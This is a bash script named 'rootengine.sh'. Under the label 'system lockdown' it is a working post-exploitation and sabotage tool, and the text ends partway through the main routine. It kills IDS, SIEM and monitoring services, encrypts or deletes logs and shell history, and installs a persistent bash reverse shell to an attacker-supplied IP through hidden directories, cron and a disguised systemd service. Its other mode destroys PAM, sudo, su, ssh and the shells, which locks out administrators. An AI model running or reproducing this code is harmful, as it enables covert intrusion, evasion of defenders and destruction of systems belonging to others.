#!/bin/bash
# rootengine.sh - Enhanced system lockdown with security tool neutralization
# Compatible with: Ubuntu, Debian, Fedora, Linux Mint, Arch Linux, Manjaro, openSUSE, Pop!_OS, Kali Linux, AlmaLinux

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
WHITE='\033[1;37m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Help function
show_help() {
    echo -e "${RED}"
    cat << "EOF"
██████╗  ██████╗  ██████╗ ████████╗███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗
██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝
██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗  
██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝  
██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗ 
╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝ v1.0 
EOF
    echo -e "${NC}"
    echo -e "${CYAN}Author: @rafigk2v9c${NC}"
    echo ""
    cat << 'HELP_EOF'
ROOTENGINE - System Lockdown Tool

USAGE:
    sudo ./rootengine.sh

OPTIONS:
    --help, -h          Show this help message
    (no option)         Interactive menu mode

MODES:
    1. Aggressive       - Maximum lockdown
    2. Backdoor         - Lockdown + reverse shell access

FEATURES:
    - Disables IDS/IPS 
    - Blocks SIEM 
    - Stops monitoring 
    - Encrypts/deletes all logs
    - Blocks admin access (SSH, FTP, console)
    - Preserves web services (HTTP/HTTPS)
    - Multiple backdoor persistence methods

WARNING:
    Irreversible modifications! Test environments only.
    Always take system snapshots before running.

HELP_EOF
}

# Check for --help argument BEFORE showing banner
if [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
    show_help
    exit 0
fi

# Display Banner (only if not help)
echo -e "${RED}"
cat << "EOF"
██████╗  ██████╗  ██████╗ ████████╗███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗
██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝
██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗  
██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝  
██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗
╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝ v1.0 
EOF
echo -e "${NC}"

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}ERROR: This script must be run as root${NC}"
    echo -e "${YELLOW}Usage: sudo $0${NC}"
    exit 1
fi


# Global variables
BACKDOOR_MODE=0
BACKDOOR_IP=""
BACKDOOR_PORT=""
HIDDEN_DIRS=(
    "/.cache/.system"
    "/var/tmp/.x11"
    "/dev/shm/.config"
)
# Cache init system for performance
INIT_SYSTEM=""

# Interactive menu function
show_menu() {
    clear
    echo -e "${RED}"
    cat << "EOF"
██████╗  ██████╗  ██████╗ ████████╗███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗
██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝
██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗  
██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝  
██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗
╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝ v1.0 
EOF
    echo -e "${NC}"
    echo -e "${GREEN}Select execution mode:${NC}"
    echo ""
    echo -e "${YELLOW}1)${NC} Aggressive Mode - Maximum Lockdown"
    echo -e "${YELLOW}2)${NC} Backdoor Mode - Attacker Access Preserved"
    echo ""
    echo -n -e "${GREEN}Enter your choice (1 or 2): ${NC}"
    read -r choice
    
    case $choice in
        1)
            BACKDOOR_MODE=0
            echo -e "${GREEN}Mode selected: Aggressive (Maximum Lockdown)${NC}"
            sleep 1
            ;;
        2)
            BACKDOOR_MODE=1
            echo -e "${GREEN}Mode selected: Backdoor Mode${NC}"
            sleep 1
            echo ""
            echo -n -e "${GREEN}Enter attacker IP address: ${NC}"
            read -r BACKDOOR_IP
            echo -n -e "${GREEN}Enter attacker port: ${NC}"
            read -r BACKDOOR_PORT
            echo -e "${GREEN}Backdoor configured: $BACKDOOR_IP:$BACKDOOR_PORT${NC}"
            sleep 1
            ;;
        *)
            echo -e "${RED}Invalid choice!${NC}"
            sleep 1
            show_menu
            ;;
    esac
}

# Progress indicator function
show_progress() {
    local pid=$1
    local message=$2
    local spin='-\|/'
    local i=0
    echo -n -e "${YELLOW}$message ${NC}"
    while kill -0 "$pid" 2>/dev/null; do
        i=$(( (i+1) %4 ))
        echo -n -e "${BLUE}${spin:$i:1}${NC}"
        echo -ne "\b"
        sleep 0.1
    done
    wait "$pid" 2>/dev/null
    echo -e "\r${GREEN}$message [DONE]${NC}"
}

# Function to check if command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to detect init system (cached)
detect_init_system() {
    if [ -n "$INIT_SYSTEM" ]; then
        echo "$INIT_SYSTEM"
        return
    fi
    
    if [ -d /run/systemd/system ] || [ -d /etc/systemd ]; then
        INIT_SYSTEM="systemd"
    elif command_exists initctl; then
        INIT_SYSTEM="upstart"
    else
        INIT_SYSTEM="sysvinit"
    fi
    echo "$INIT_SYSTEM"
}

# Function to manage services
service_command() {
    local action=$1
    local service=$2
    local init_system=$(detect_init_system)
    
    case $init_system in
        "systemd")
            if [ -f "/etc/systemd/system/${service}.service" ] || [ -f "/usr/lib/systemd/system/${service}.service" ] || [ -f "/lib/systemd/system/${service}.service" ]; then
                systemctl "$action" "$service" 2>/dev/null
            fi
            ;;
        "upstart")
            if [ -f "/etc/init/${service}.conf" ]; then
                initctl "$action" "$service" 2>/dev/null
            fi
            ;;
        "sysvinit")
            if [ -f "/etc/init.d/${service}" ]; then
                /etc/init.d/"$service" "$action" 2>/dev/null
            fi
            ;;
    esac
}



# Neutralize IDS/IPS systems (Both modes)
neutralize_ids_ips() {
    echo -e "${GREEN}Neutralizing IDS/IPS systems...${NC}"
    
    # Snort
    for service in snort snortd; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "snort" 2>/dev/null
    
    # Suricata
    for service in suricata; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "suricata" 2>/dev/null
    
    # Zeek (Bro)
    for service in zeek bro; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "zeek\|bro" 2>/dev/null
    
    # Fail2ban
    for service in fail2ban; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "fail2ban" 2>/dev/null
    
    # Tripwire
    for service in tripwire; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "tripwire" 2>/dev/null
    
    # AIDE
    for service in aide; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "aide" 2>/dev/null
    
    # Samhain
    for service in samhain; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "samhain" 2>/dev/null
    
    echo -e "${GREEN}IDS/IPS neutralization complete [DONE]${NC}"
}

# Neutralize SIEM/SOAR platforms (Both modes)
neutralize_siem_soar() {
    echo -e "${GREEN}Neutralizing SIEM/SOAR platforms...${NC}"
    
    # Splunk
    for service in splunk splunkd; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "splunk" 2>/dev/null
    
    # Elastic Stack
    for service in elasticsearch logstash kibana filebeat metricbeat auditbeat; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "elastic\|logstash\|kibana\|beat" 2>/dev/null
    
    # IBM QRadar
    for service in qradar; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "qradar" 2>/dev/null
    
    # ArcSight
    for service in arcsight; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "arcsight" 2>/dev/null
    
    # LogRhythm
    for service in logrhythm; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "logrhythm" 2>/dev/null
    
    # TheHive
    for service in thehive cortex; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "thehive\|cortex" 2>/dev/null
    
    # Graylog
    for service in graylog; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "graylog" 2>/dev/null
    
    # Security Onion
    for service in securityonion; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "securityonion" 2>/dev/null
    
    # AlienVault OSSIM
    for service in ossim; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "ossim\|alienvault" 2>/dev/null
    
    echo -e "${GREEN}SIEM/SOAR neutralization complete [DONE]${NC}"
}

# Neutralize monitoring tools (Both modes)
neutralize_monitoring() {
    echo -e "${GREEN}Neutralizing monitoring tools...${NC}"
    
    # Nagios
    for service in nagios nrpe; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "nagios\|nrpe" 2>/dev/null
    
    # Zabbix
    for service in zabbix-agent zabbix-server; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "zabbix" 2>/dev/null
    
    # Prometheus
    for service in prometheus node_exporter; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "prometheus\|node_exporter" 2>/dev/null
    
    # Grafana
    for service in grafana grafana-server; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "grafana" 2>/dev/null
    
    # Datadog
    for service in datadog-agent; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "datadog" 2>/dev/null
    
    # New Relic
    for service in newrelic-infra; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "newrelic" 2>/dev/null
    
    echo -e "${GREEN}Monitoring neutralization complete [DONE]${NC}"
}

# Enhanced log management with encryption fallback (Both modes)
manage_logs() {
    echo -e "${GREEN}Managing system logs...${NC}"
    
    # Stop logging services first
    for service in rsyslog syslog-ng syslog systemd-journald auditd; do
        service_command stop $service 2>/dev/null
        service_command disable $service 2>/dev/null
    done
    pkill -9 -f "rsyslog\|syslog\|journald\|auditd" 2>/dev/null
    
    # Encrypt or delete logs
    if command_exists openssl; then
        echo -e "${YELLOW}Encrypting logs with openssl...${NC}"
        # Generate random key using /dev/urandom for cross-platform compatibility
        RANDOM_KEY=$(head -c 32 /dev/urandom 2>/dev/null | base64 | head -c 32)
        # Fallback if /dev/urandom not available
        if [ -z "$RANDOM_KEY" ]; then
            RANDOM_KEY=$(echo "$(date +%s)$RANDOM$$" | sha256sum | base64 | head -c 32)
        fi
        
        for logdir in /var/log /var/log/audit /var/log/messages /var/log/secure /var/log/auth.log; do
            if [ -d "$logdir" ]; then
                for logfile in $(find "$logdir" -type f 2>/dev/null); do
                    if [ -f "$logfile" ] && [ -w "$logfile" ]; then
                        if openssl enc -aes-256-cbc -salt -in "$logfile" -out "${logfile}.enc" -k "$RANDOM_KEY" 2>/dev/null; then
                            rm -f "$logfile" 2>/dev/null
                        else
                            rm -f "$logfile" 2>/dev/null
                        fi
                    fi
                done
            elif [ -f "$logdir" ] && [ -w "$logdir" ]; then
                if openssl enc -aes-256-cbc -salt -in "$logdir" -out "${logdir}.enc" -k "$RANDOM_KEY" 2>/dev/null; then
                    rm -f "$logdir" 2>/dev/null
                else
                    rm -f "$logdir" 2>/dev/null
                fi
            fi
        done
    else
        echo -e "${YELLOW}OpenSSL not available, deleting logs directly...${NC}"
        for logdir in /var/log /var/log/audit; do
            if [ -d "$logdir" ]; then
                rm -rf "$logdir"/* 2>/dev/null
            fi
        done
    fi
    
    # Clear systemd journal
    if command_exists journalctl; then
        journalctl --vacuum-time=1s 2>/dev/null
        journalctl --rotate 2>/dev/null
        journalctl --vacuum-time=1s 2>/dev/null
    fi
    
    # Clear audit logs
    if [ -f /var/log/audit/audit.log ]; then
        cat /dev/null > /var/log/audit/audit.log 2>/dev/null
    fi
    
    # Clear wtmp, btmp, lastlog
    for file in /var/log/wtmp /var/log/btmp /var/log/lastlog; do
        if [ -f "$file" ]; then
            cat /dev/null > "$file" 2>/dev/null
        fi
    done
    
    # Clear shell history
    for histfile in /root/.bash_history /root/.zsh_history /home/*/.bash_history /home/*/.zsh_history; do
        if [ -f "$histfile" ]; then
            cat /dev/null > "$histfile" 2>/dev/null
        fi
    done
    
    # Unset history variables
    unset HISTFILE
    unset HISTSIZE
    export HISTSIZE=0
    
    echo -e "${GREEN}Log management complete [DONE]${NC}"
}

# Enhanced backdoor setup with multiple persistence methods
setup_enhanced_backdoor() {
    if [ $BACKDOOR_MODE -eq 0 ]; then
        return
    fi
    
    echo -e "${GREEN}Setting up enhanced backdoor persistence...${NC}"
    
    # Create multiple hidden locations
    for dir in "${HIDDEN_DIRS[@]}"; do
        mkdir -p "$dir" 2>/dev/null
        chmod 700 "$dir" 2>/dev/null
        
        # Create bash reverse shell (works everywhere - no Python/Perl dependency)
        cat > "$dir/update.sh" << 'BACKDOOR_SCRIPT'
#!/bin/bash
while true; do
    (bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1) 2>/dev/null
    sleep 60
done &
BACKDOOR_SCRIPT
        
        sed -i "s/ATTACKER_IP/$BACKDOOR_IP/g" "$dir/update.sh"
        sed -i "s/ATTACKER_PORT/$BACKDOOR_PORT/g" "$dir/update.sh"
        chmod 700 "$dir/update.sh" 2>/dev/null
        
        # Start backdoor immediately
        nohup "$dir/update.sh" >/dev/null 2>&1 &
        
        # Add to crontab (check if not already exists)
        if ! crontab -l 2>/dev/null | grep -q "$dir/update.sh"; then
            (crontab -l 2>/dev/null; echo "* * * * * $dir/update.sh >/dev/null 2>&1") | crontab - 2>/dev/null
            (crontab -l 2>/dev/null; echo "@reboot $dir/update.sh >/dev/null 2>&1") | crontab - 2>/dev/null
        fi
        
        # Create systemd service if available
        if [ -d /etc/systemd/system ]; then
            service_name="system-$(echo $dir | tr '/' '-' | sed 's/^-//')"
            cat > "/etc/systemd/system/${service_name}.service" << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=forking
ExecStart=$dir/update.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
            systemctl daemon-reload 2>/dev/null
            systemctl enable "${service_name}.service" 2>/dev/null
            systemctl start "${service_name}.service" 2>/dev/null
        fi
    done
    
    echo -e "${GREEN}Backdoor persistence established [DONE]${NC}"
}

# Kernel level restrictions (Mode 1 only - Maximum lockdown)
apply_kernel_restrictions() {
    if [ $BACKDOOR_MODE -eq 1 ]; then
        echo -e "${YELLOW}Skipping kernel restrictions (Backdoor mode)${NC}"
        return
    fi
    
    echo -e "${GREEN}Applying kernel-level restrictions...${NC}"
    
    # Disable kernel module loading
    if [ -f /proc/sys/kernel/modules_disabled ]; then
        echo 1 > /proc/sys/kernel/modules_disabled 2>/dev/null
    fi
    
    # Disable SysRq keys
    if [ -f /proc/sys/kernel/sysrq ]; then
        echo 0 > /proc/sys/kernel/sysrq 2>/dev/null
    fi
    
    # Limit PTY allocation
    if [ -f /proc/sys/kernel/pty/max ]; then
        echo 2 > /proc/sys/kernel/pty/max 2>/dev/null
    fi
    
    # Disable core dumps
    if [ -f /proc/sys/kernel/core_pattern ]; then
        echo "|/bin/false" > /proc/sys/kernel/core_pattern 2>/dev/null
    fi
    
    # Disable swap
    swapoff -a 2>/dev/null
    
    echo -e "${GREEN}Kernel restrictions applied [DONE]${NC}"
}

# Resource restrictions (Mode 1 only)
apply_resource_restrictions() {
    if [ $BACKDOOR_MODE -eq 1 ]; then
        echo -e "${YELLOW}Skipping resource restrictions (Backdoor mode)${NC}"
        return
    fi
    
    echo -e "${GREEN}Applying resource restrictions...${NC}"
    
    if [ -d /sys/fs/cgroup ]; then
        # CPU restrictions
        if [ -d /sys/fs/cgroup/cpu ]; then
            mkdir -p /sys/fs/cgroup/cpu/restricted 2>/dev/null
            echo 10000 > /sys/fs/cgroup/cpu/restricted/cpu.cfs_quota_us 2>/dev/null
        fi
        
        # Memory restrictions
        if [ -d /sys/fs/cgroup/memory ]; then
            mkdir -p /sys/fs/cgroup/memory/restricted 2>/dev/null
            echo 52428800 > /sys/fs/cgroup/memory/restricted/memory.limit_in_bytes 2>/dev/null
        fi
    fi
    
    echo -e "${GREEN}Resource restrictions applied [DONE]${NC}"
}

# User isolation (Mode 1 only - Maximum lockdown)
isolate_users() {
    if [ $BACKDOOR_MODE -eq 1 ]; then
        echo -e "${YELLOW}Skipping user isolation (Backdoor mode)${NC}"
        return
    fi
    
    echo -e "${GREEN}Isolating user accounts...${NC}"
    
    # Lock all non-system users (EXCEPT web server users)
    for user in $(awk -F: '$3 >= 1000 && $3 < 65534 {print $1}' /etc/passwd 2>/dev/null); do
        # Skip web server users
        if [ "$user" != "www-data" ] && [ "$user" != "nginx" ] && [ "$user" != "apache" ] && [ "$user" != "httpd" ]; then
            usermod -L "$user" 2>/dev/null
            usermod -s /sbin/nologin "$user" 2>/dev/null
        fi
    done
    
    # Change root shell
    usermod -s /bin/false root 2>/dev/null
    
    echo -e "${GREEN}User accounts isolated (web users protected) [DONE]${NC}"
}

# TTY destruction (Mode 1 only)
destroy_terminals() {
    if [ $BACKDOOR_MODE -eq 1 ]; then
        echo -e "${YELLOW}Skipping TTY destruction (Backdoor mode)${NC}"
        return
    fi
    
    echo -e "${GREEN}Destroying terminal devices...${NC}"
    
    # Disable all TTY devices
    for tty in /dev/tty*; do
        if [ -c "$tty" ]; then
            chmod 000 "$tty" 2>/dev/null
        fi
    done
    
    # Disable PTY master
    chmod 000 /dev/ptmx 2>/dev/null
    
    # Disable console
    chmod 000 /dev/console 2>/dev/null
    
    # Unmount devpts
    umount /dev/pts 2>/dev/null
    
    echo -e "${GREEN}Terminal devices destroyed [DONE]${NC}"
}

# Binary sabotage (Mode 1 only - Maximum lockdown)
sabotage_system_binaries() {
    if [ $BACKDOOR_MODE -eq 1 ]; then
        echo -e "${YELLOW}Skipping binary sabotage (Backdoor mode)${NC}"
        return
    fi
    
    echo -e "${GREEN}Sabotaging system binaries (protecting web servers)...${NC}"
    
    # CRITICAL: Never touch web server binaries
    # Protected: apache2, httpd, nginx, lighttpd, php-fpm, etc.
    
    # Remove sudo and su first
    for cmd in sudo su; do
        for path in /usr/bin/$cmd /bin/$cmd /usr/sbin/$cmd /sbin/$cmd; do
            rm -f "$path" 2>/dev/null
        done
    done
    
    # Remove network tools (but NOT those used by web servers)
    for cmd in nc netcat telnet ssh scp sftp; do
        for path in /usr/bin/$cmd /bin/$cmd /usr/sbin/$cmd /sbin/$cmd; do
            rm -f "$path" 2>/dev/null
        done
    done
    # Keep wget/curl for web server functionality
    
    # Remove system management tools (but keep what web servers might need)
    for cmd in init telinit; do
        for path in /usr/bin/$cmd /bin/$cmd /usr/sbin/$cmd /sbin/$cmd; do
            rm -f "$path" 2>/dev/null
        done
    done
    # Keep systemctl and service for web server management
    
    # Neutralize shells LAST (to avoid killing this script prematurely)
    # Schedule for after script completes
    cat > /tmp/.sabotage_shells.sh << 'SHELL_SABOTAGE'
#!/bin/sh
sleep 2
for shell in bash sh dash zsh; do
    for path in /bin/$shell /usr/bin/$shell; do
        if [ -f "$path" ] && [ -x "$path" ]; then
            mv "$path" "${path}.disabled" 2>/dev/null
            echo '#!/bin/false' > "$path" 2>/dev/null
            chmod 000 "$path" 2>/dev/null
        fi
    done
done
rm -f /tmp/.sabotage_shells.sh
SHELL_SABOTAGE
    chmod +x /tmp/.sabotage_shells.sh
    nohup /tmp/.sabotage_shells.sh >/dev/null 2>&1 &
    
    echo -e "${GREEN}System binaries sabotaged (web servers protected) [DONE]${NC}"
}

# PAM destruction (Mode 1 only)
destroy_pam() {
    if [ $BACKDOOR_MODE -eq 1 ]; then
        echo -e "${YELLOW}Skipping PAM destruction (Backdoor mode)${NC}"
        return
    fi
    
    echo -e "${GREEN}Destroying PAM authentication...${NC}"
    
    # Modify all PAM files to deny access
    if [ -d /etc/pam.d ]; then
        for pam_file in /etc/pam.d/*; do
            if [ -f "$pam_file" ] && [ -w "$pam_file" ]; then
                cat > "$pam_file" << 'PAM_DENY'
auth required pam_deny.so
account required pam_deny.so
password required pam_deny.so
session required pam_deny.so
PAM_DENY
            fi
        done
    fi
    
    # Break nsswitch
    if [ -f /etc/nsswitch.conf ] && [ -w /etc/nsswitch.conf ]; then
        echo "passwd: files" > /etc/nsswitch.conf
        echo "shadow: files" >> /etc/nsswitch.conf
        echo "group: files" >> /etc/nsswitch.conf
    fi
    
    # Deny all in access.conf
    if [ -f /etc/security/access.conf ] && [ -w /etc/security/access.conf ]; then
        echo "- : ALL : ALL" > /etc/security/access.conf
    fi
    
    echo -e "${GREEN}PAM authentication destroyed [DONE]${NC}"
}

# Filesystem restrictions (Mode 1 only)
restrict_filesystem() {
    if [ $BACKDOOR_MODE -eq 1 ]; then
        echo -e "${YELLOW}Skipping filesystem restrictions (Backdoor mode)${NC}"
        return
    fi
    
    echo -e "${GREEN}Applying filesystem restrictions (protecting web roots)...${NC}"
    
    # Make /tmp tiny and restricted (but don't break it completely for web uploads)
    mount -o remount,size=10M,nosuid,nodev /tmp 2>/dev/null
    # Removed noexec to allow temp script execution by web servers
    
    # NOTE: Removed dangerous read-only remount that could break the system
    # Making /usr, /bin, /sbin read-only is too risky as they're usually part of root partition
    
    # Clean root directory (but keep web server configs if any)
    rm -rf /root/.bash* 2>/dev/null
    rm -rf /root/.ssh 2>/dev/null
    # Don't delete /root/* to preserve any web server configs
    
    # Exhaust inodes in /tmp (but leave some for web server)
    mkdir -p /tmp/.inode_fill 2>/dev/null
    for i in $(seq 1 5000); do  # Reduced from 10000 to 5000
        touch "/tmp/.inode_fill/$i" 2>/dev/null
    done
    
    # NEVER touch these web directories:
    # /var/www, /usr/share/nginx, /srv/www, /var/www/html
    
    echo -e "${GREEN}Filesystem restrictions applied (web roots safe) [DONE]${NC}"
}

# Enhanced web service protection
protect_web_services() {
    echo -e "${GREEN}Setting up MAXIMUM web service protection...${NC}"
    
    # Set HIGHEST priority for web services (CRITICAL!)
    for service in apache2 httpd nginx lighttpd php-fpm; do
        if pgrep "$service" > /dev/null 2>&1; then
            for pid in $(pgrep "$service" 2>/dev/null); do
                # Maximum nice priority
                renice -20 -p "$pid" 2>/dev/null
                # Real-time I/O priority
                if command_exists ionice; then
                    ionice -c1 -n0 -p "$pid" 2>/dev/null
                fi
                # Real-time CPU scheduling
                if command_exists chrt; then
                    chrt -f -p 99 "$pid" 2>/dev/null
                fi
                # MAXIMUM protection from OOM killer
                if [ -f "/proc/$pid/oom_score_adj" ]; then
                    echo -1000 > "/proc/$pid/oom_score_adj" 2>/dev/null
                fi
                # Never freeze these processes
                if [ -f "/proc/$pid/freeze" ]; then
                    echo 0 > "/proc/$pid/freeze" 2>/dev/null
                fi
            done
            echo -e "${GREEN}✓ Protected: $service (PID: $(pgrep "$service" | head -1))${NC}"
        fi
    done
    
    # Enhanced watchdog - AGGRESSIVE web server protection
    cat > /tmp/web_watchdog.sh << 'WATCHDOG_SCRIPT'
#!/bin/sh
# CRITICAL: Keep web servers alive AT ALL COSTS
while true; do
    for service in apache2 httpd nginx lighttpd php-fpm; do
        if ! pgrep "$service" >/dev/null 2>&1; then
            # Try multiple methods to start the service
            systemctl start "$service" 2>/dev/null || \
            service "$service" start 2>/dev/null || \
            /etc/init.d/"$service" start 2>/dev/null
            
            sleep 2
            # Apply maximum protection to restarted processes
            for pid in $(pgrep "$service" 2>/dev/null); do
                renice -20 -p "$pid" 2>/dev/null
                if command -v ionice >/dev/null 2>&1; then
                    ionice -c1 -n0 -p "$pid" 2>/dev/null
                fi
                if command -v chrt >/dev/null 2>&1; then
                    chrt -f -p 99 "$pid" 2>/dev/null
                fi
                if [ -f "/proc/$pid/oom_score_adj" ]; then
                    echo -1000 > "/proc/$pid/oom_score_adj" 2>/dev/null
                fi
            done
        fi
    done
    
    # Check if web ports are accessible
    if [ -f /proc/net/tcp ]; then
        if ! grep -q "0050\\|01BB" /proc/net/tcp 2>/dev/null; then
            # Ports not open! Restart ALL web servers
            for service in apache2 httpd nginx lighttpd; do
                systemctl restart "$service" 2>/dev/null
            done
        fi
    fi
    
    sleep 5  # Check every 5 seconds (aggressive)
done
WATCHDOG_SCRIPT
    
    chmod +x /tmp/web_watchdog.sh
    nohup /tmp/web_watchdog.sh >/dev/null 2>&1 &
    
    # Create systemd service for watchdog
    if [ -d /etc/systemd/system ]; then
        cat > /etc/systemd/system/web-watchdog.service << 'WATCHDOG_SERVICE'
[Unit]
Description=Web Service Watchdog
After=network.target

[Service]
Type=simple
ExecStart=/tmp/web_watchdog.sh
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
WATCHDOG_SERVICE
        
        systemctl daemon-reload 2>/dev/null
        systemctl enable web-watchdog.service 2>/dev/null
        systemctl start web-watchdog.service 2>/dev/null
    fi
    
    echo -e "${GREEN}Web service protection enabled [DONE]${NC}"
}

# Setup firewall
setup_firewall() {
    echo -e "${YELLOW}Configuring firewall...${NC}"
    
    if [ -x /sbin/iptables ] || [ -x /usr/sbin/iptables ]; then
        IPTABLES_CMD=$(command -v iptables)
        $IPTABLES_CMD -F 2>/dev/null
        $IPTABLES_CMD -X 2>/dev/null
        $IPTABLES_CMD -P INPUT DROP 2>/dev/null
        $IPTABLES_CMD -P FORWARD DROP 2>/dev/null
        $IPTABLES_CMD -P OUTPUT ACCEPT 2>/dev/null
        
        # Allow web ports
        $IPTABLES_CMD -A INPUT -p tcp --dport 80 -j ACCEPT 2>/dev/null
        $IPTABLES_CMD -A INPUT -p tcp --dport 443 -j ACCEPT 2>/dev/null
        
        # Allow backdoor port if in backdoor mode
        if [ $BACKDOOR_MODE -eq 1 ] && [ -n "$BACKDOOR_PORT" ]; then
            $IPTABLES_CMD -A INPUT -p tcp --dport "$BACKDOOR_PORT" -j ACCEPT 2>/dev/null
            $IPTABLES_CMD -A OUTPUT -p tcp --dport "$BACKDOOR_PORT" -j ACCEPT 2>/dev/null
        fi
        
        # Block admin ports
        $IPTABLES_CMD -A INPUT -p tcp --dport 22 -j DROP 2>/dev/null
        $IPTABLES_CMD -A INPUT -p tcp --dport 21 -j DROP 2>/dev/null
        $IPTABLES_CMD -A INPUT -p tcp --dport 23 -j DROP 2>/dev/null
        $IPTABLES_CMD -A INPUT -p tcp --dport 3306 -j DROP 2>/dev/null
        
        # Allow loopback and established connections
        $IPTABLES_CMD -A INPUT -i lo -j ACCEPT 2>/dev/null
        $IPTABLES_CMD -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null
        
        echo -e "${GREEN}iptables configured [DONE]${NC}"
    elif [ -x /usr/sbin/ufw ] || [ -x /usr/bin/ufw ]; then
        UFW_CMD=$(command -v ufw)
        $UFW_CMD --force reset >/dev/null 2>&1
        $UFW_CMD default deny incoming >/dev/null 2>&1
        $UFW_CMD allow 80/tcp >/dev/null 2>&1
        $UFW_CMD allow 443/tcp >/dev/null 2>&1
        
        if [ $BACKDOOR_MODE -eq 1 ] && [ -n "$BACKDOOR_PORT" ]; then
            $UFW_CMD allow "$BACKDOOR_PORT"/tcp >/dev/null 2>&1
        fi
        
        $UFW_CMD --force enable >/dev/null 2>&1
        echo -e "${GREEN}ufw configured [DONE]${NC}"
    fi
}

# Main execution
show_menu
setup_enhanced_backdoor

echo -e "${GREEN}Starting system lockdown...${NC}"
echo ""

# 1. Neutralize security monitoring (BOTH MODES)
neutralize_ids_ips
neutralize_siem_soar
neutralize_monitoring

# 2. Manage logs (BOTH MODES - Encrypt or delete)
manage_logs

# 3. Start web services
echo -e "${GREEN}Starting web services...${NC}"
for service in apache2 httpd nginx; do
    if [ -f "/etc/systemd/system/${service}.service" ] || [ -f "/usr/lib/systemd/system/${service}.service" ] || [ -f "/lib/systemd/system/${service}.service" ] || [ -f "/etc/init.d/${service}" ]; then
        service_command enable $service
        service_command start $service
        echo -e "${GREEN}$service started [DONE]${NC}"
    fi
done

# 4. Block administrative channels
echo -e "${GREEN}Blocking administrative channels...${NC}"
for service in ssh sshd vsftpd proftpd pure-ftpd telnetd; do
